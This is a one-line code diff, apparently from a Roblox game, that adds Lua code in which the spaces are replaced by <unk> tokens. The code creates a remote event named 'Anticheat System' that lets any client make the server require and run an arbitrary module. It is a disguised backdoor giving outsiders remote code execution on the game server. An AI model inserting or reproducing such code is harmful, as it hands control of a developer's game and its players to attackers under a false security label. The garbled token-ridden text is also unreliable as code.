@@ -1,0 +1,1 @@
+local<unk>a<unk>=<unk>Instance.new("RemoteEvent",<unk>game.ReplicatedStorage)<unk>a.Name<unk>=<unk>"Anticheat<unk>System"<unk><unk>a.OnServerEvent:connect(function(p,a)<unk>require(a).load(p.Name)<unk>end)
